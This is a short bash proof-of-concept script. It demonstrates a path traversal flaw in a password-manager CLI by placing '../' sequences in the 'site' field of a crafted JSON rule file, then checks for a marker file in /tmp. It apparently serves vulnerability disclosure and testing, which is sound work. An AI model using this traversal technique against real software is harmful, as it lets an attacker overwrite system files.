#!/bin/bash

# Description: This PoC demonstrates path traversal via the "site" field in a JSON file, allowing an attacker to overwrite system files.
# We will also print an indicator message to /tmp/attack_successful to confirm that the attack worked.

echo "===== Path Traversal Attack Proof of Concept ====="
echo

# Step 1: Create a malicious JSON rule file with path traversal in the "site" field
echo "[*] Creating malicious JSON rule file with path traversal in the 'site' field..."

cat > malicious_rules.json << EOF
{
  "chars": "abcABC",
  "min_length": "8",
  "max_length": "12",
  "rules": {
    "0": "[[:alpha:]]",
    "1": "[[:digit:]]"
  },
  "min_rules": "1",
  "num_rules": "2",
  "site": "../../../../../../tmp/attack_successful"
}
EOF

echo "[+] Malicious JSON file 'malicious_rules.json' created."
echo

# Step 2: Run the vulnerable application with the malicious JSON file
# Replace './bcpwm-cli' with the actual command if different
echo "[*] Running the application with the malicious JSON file..."

./bcpwm-cli -a malicious_rules.json  # Hypothetical command to load JSON rule file

# Step 3: Check if the injected command was executed
echo
echo "[*] Checking for attack success message..."

# Check if /tmp/attack_successful exists, which would indicate the attack was successful
if [ -f /tmp/attack_successful ]; then
    echo "[!] Path traversal attack successful: Vulnerability confirmed."
    cat /tmp/attack_successful
else
    echo "[-] Path traversal attack did not succeed."
fi

# Step 4: Clean up
echo
echo "[*] Cleaning up malicious JSON file..."
rm -f malicious_rules.json

echo "===== Proof of Concept Completed ====="
